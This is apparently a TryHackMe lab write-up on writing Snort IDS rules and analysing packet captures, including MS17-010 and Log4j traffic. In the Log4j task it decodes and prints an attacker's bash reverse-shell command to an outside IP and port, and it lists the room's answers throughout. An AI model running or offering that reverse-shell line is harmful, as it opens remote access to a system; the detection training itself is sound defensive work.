
# TryHackMe Snort Challenge — The Basics Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-Medium%20Challenge-orange) 
![Snort](https://img.shields.io/badge/Snort-IDS%20Rules-blue) 
![Network Analysis](https://img.shields.io/badge/Network-Traffic%20Analysis-green)

A comprehensive walkthrough of TryHackMe's **Snort Challenge — The Basics** room, covering network traffic analysis, Snort rule creation, and malicious activity detection.

## 📋 Table of Contents

- [Introduction](#introduction)
- [Task 2: Writing IDS Rules (HTTP)](#task-2-writing-ids-rules-http)
- [Task 3: Writing IDS Rules (FTP)](#task-3-writing-ids-rules-ftp)
- [Task 4: Writing IDS Rules (PNG)](#task-4-writing-ids-rules-png)
- [Task 5: Writing IDS Rules (Torrent Metafile)](#task-5-writing-ids-rules-torrent-metafile)
- [Task 6: Troubleshooting Rule Syntax Errors](#task-6-troubleshooting-rule-syntax-errors)
- [Task 7: Using External Rules (MS17–010)](#task-7-using-external-rules-ms17-010)
- [Task 8: Using External Rules (Log4j)](#task-8-using-external-rules-log4j)
- [Task 9: Conclusion](#task-9-conclusion)
- [Challenges & Difficulties](#challenges--difficulties)
- [Lessons Learned](#lessons-learned)
- [Conclusion](#conclusion)

## 🚀 Introduction

This challenge focuses on using Snort to investigate network traffic and detect malicious activity. Prior completion of the Snort room is recommended for better understanding.

## 🔍 Task 2: Writing IDS Rules (HTTP)

### 1. Detect all TCP port 80 traffic
**Rule:**
```bash
alert tcp any 80 <> any any (msg:"TCP port 80"; sid:1000001; rev:1;)
```
**Command:**
```bash
sudo snort -r mx-3.pcap -c local.rules -A full -l .
```
**Result:** 194 packets detected

### 2. Destination address of packet 63
**Command:**
```bash
sudo snort -r snort.log.1723768042 -n 63
```
**Result:** 63.251.57.18

### 3. ACK number of packet 64
**Command:**
```bash
sudo snort -r snort.log.1723768042 -n 64
```
**Result:** 2958841264

### 4. SEQ number of packet 62
**Command:**
```bash
sudo snort -r snort.log.1723768042 -n 62
```
**Result:** 2958841264

### 5-7. Packet 65 details
**Command:**
```bash
sudo snort -r snort.log.1723768042 -n 65
```
**Results:**
- TTL: 46
- Source IP: 192.168.1.104
- Source Port: 49263

![Packet 65 Details](images/task2-packet65.png)

## 📁 Task 3: Writing IDS Rules (FTP)

### 1. Detect all TCP port 21 traffic
**Rule:**
```bash
alert tcp any 21 <> any any (msg:"FTP Traffic"; sid:1000001; rev:1;)
```
**Result:** 227 packets detected

### 2. FTP service name
**Command:**
```bash
sudo strings snort.log.1723772256 | grep "FTP"
```
**Result:** vsFTPd

### 3. Detect failed FTP login attempts
**Rule:**
```bash
alert tcp any 21 <> any any (content:"530"; sid:1000001;)
```
**Result:** 3 packets detected

### 4. Detect successful FTP logins
**Rule:**
```bash
alert tcp any 21 <> any any (content:"230"; sid:1000001;)
```
**Result:** 1 packet detected

### 5. Detect FTP login attempts with valid username
**Rule:**
```bash
alert tcp any 21 <> any any (content:"331"; sid:1000001;)
```
**Result:** 3 packets detected

### 6. Detect "Administrator" login attempts
**Rule:**
```bash
alert tcp any 21 <> any any (content:"Administrator"; content:"331"; sid:1000001;)
```
**Result:** 1 packet detected

## 🖼️ Task 4: Writing IDS Rules (PNG)

### 1. Detect PNG file and find software name
**Rule:**
```bash
alert tcp any any <> any any (content:"PNG"; sid:1000001;)
```
**Software:** Adobe ImageReady

### 2. Detect GIF file and find image format
**Rule:**
```bash
alert tcp any any <> any any (content:"GIF"; sid:1000001;)
```
**Format:** GIF89a

## 📂 Task 5: Writing IDS Rules (Torrent Metafile)

### 1. Detect torrent metafile
**Rule:**
```bash
alert tcp any any <> any any (content:".torrent"; sid:1000001;)
```
**Result:** 1 packet detected

### 2-4. Torrent application details
**Command:**
```bash
sudo strings snort.log.1723779435
```
**Results:**
- Application: Transmission
- MIME Type: application/x-bittorrent
- Hostname: torrent.ubuntu.com

![Torrent Strings](images/task5-strings.png)

## 🔧 Task 6: Troubleshooting Rule Syntax Errors

Fixed various syntax errors in provided rule files:
1. Missing space before rule options
2. Missing "any" in source
3. Duplicate SIDs
4. Incorrect msg syntax and duplicate SIDs
5. Illegal direction and incorrect msg syntax
6. Case sensitivity in content detection
7. Missing msg rule option

## 💻 Task 7: Using External Rules (MS17-010)

### 1. Detect MS17-010 exploitation
**Command:**
```bash
sudo snort -r ms-17-010.pcap -c local.rules
```
**Result:** 26 packets detected

### 2. Detect "\IPC$" keyword
**Rule:**
```bash
alert tcp any any <> any any (msg:"\\IPC$ detected"; content:"\\IPC$"; sid:1000001; rev:1;)
```
**Result:** 4 packets detected

### 3. Requested path
**Result:** \srvsvc

### 4. CVSS v2 score
**Result:** 10.0

## 📝 Task 8: Using External Rules (Log4j)

### 1. Detect Log4j exploitation
**Command:**
```bash
sudo snort -r log4j.pcap -c local.rules -l .
```
**Result:** 26 packets detected

### 2. Number of rules triggered
**Command:**
```bash
grep -o '\[[0-9]*:[0-9]*:[0-9]*\]' alert | cut -d: -f2 | sort -u | wc -l
```
**Result:** 3 rules

### 3. First six digits of triggered rule SIDs
**Result:** 20349, 21004, 300

### 4. Detect packets between 770-855 bytes
**Rule:**
```bash
alert tcp any any <> any any (msg:"Packet between 770 and 855"; dsize:770<>855; sid:1000001; rev:1;)
```
**Result:** 1 packet detected

### 5. Encoding algorithm
**Result:** base64

### 6. IP ID
**Result:** 35183

### 7. Decoded attacker command
**Command:**
```bash
echo "bmcKL3Vzci9iaW4vYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMzMvNDQ0NCAwPiYxCg==" | base64 -d
```
**Result:** /usr/bin/bash -i >& /dev/tcp/10.10.14.233/4444 0>&1

### 8. CVSS v2 score
**Result:** 10.0

## ✅ Task 9: Conclusion

Completed the room successfully!

## ⚠️ Challenges & Difficulties

Throughout this challenge, I encountered several obstacles that tested my understanding of Snort and network analysis:

1. **Rule Syntax Precision**: Snort rules require exact syntax - even minor errors like missing spaces or incorrect punctuation caused rules to fail completely.

2. **Regex Complexity**: Task 8's requirement to parse alert files using regex was particularly challenging. Constructing the correct pattern to extract SIDs took significant trial and error.

3. **Escape Character Handling**: Creating rules to detect patterns containing special characters like backslashes required careful attention to escape sequences.

4. **Packet Analysis**: Investigating specific packets within large log files was time-consuming until I mastered the Snort command options for filtering.

5. **Tool Integration**: Effectively combining Snort with other command-line tools (grep, cut, sort, strings) required practice to efficiently analyze outputs.

The most frustrating moment was encountering the "ERROR: Can't initialize DAQ pcap (-1) — unknown file format" error when working with packet payload detection rules. After extensive troubleshooting, I resolved it by restarting the machine, which suggests an environmental issue rather than a rule syntax problem.

## 📚 Lessons Learned

- **Terminal Command Integration**: Combining Snort with other command-line tools (grep, cut, sort, strings) makes investigation significantly more efficient
- **Syntax Precision**: Snort rules require strict syntax - small errors completely break functionality
- **Protocol Knowledge**: Understanding protocol-specific status codes (like FTP response codes) is crucial for effective detection rules
- **Regex Proficiency**: Regular expression skills are invaluable for parsing and analyzing Snort output
- **Persistence Pays Off**: Complex challenges often require multiple approaches and perseverance to solve

## 🎯 Conclusion

This room provided excellent hands-on experience with Snort rule creation and network traffic analysis. The challenges progressed logically from basic rule writing to more complex detection scenarios, reinforcing the concepts taught in the Snort introduction room. While some tasks felt repetitive, this repetition helped solidify command usage and rule syntax without constantly referring to documentation.

The later tasks introduced valuable troubleshooting and analysis techniques that are essential for real-world security monitoring. Despite the challenges with regex and syntax precision, overcoming these obstacles significantly improved my understanding of Snort and network analysis.

This room is perfect for anyone trying to develop practical skills with intrusion detection systems and network security monitoring. The hands-on approach forces you to understand not just how to write rules, but why they work the way they do.

---

**Tools Used:** Snort, grep, strings, cut, sort, base64  
**Skills Developed:** Network traffic analysis, IDS rule creation, log analysis, regex usage

For any questions or assistance, feel free to reach out!
